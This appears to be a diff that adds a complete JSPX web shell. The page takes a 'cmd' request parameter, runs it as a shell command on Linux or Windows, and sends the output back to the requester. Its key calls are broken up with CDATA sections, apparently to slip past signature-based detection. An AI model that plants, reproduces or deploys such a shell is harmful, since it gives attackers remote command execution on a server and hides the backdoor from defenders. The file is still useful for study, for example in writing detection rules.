@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page contentType="text/html"/>
+    <jsp:scriptlet>
+        String cmd = requ<![CDATA[est.get]]>Parameter("cmd");
+        boolean isLinux = true;
+        String osTyp = System.getProperty("os.name");
+        if (osTyp.toLowerCase().contains("win")) {
+        isLinux = false;
+        }
+        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+        Process process = Ru<![CDATA[ntime.getRunt]]>ime().exec(cmds);
+        java.io.InputStream is = process.getInputStream();
+        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
+        String r = null;
+        while((r = bufferedReader.readLine())!=null){
+        response.getWriter().println(r);
+        }
+    </jsp:scriptlet>
+</jsp:root>
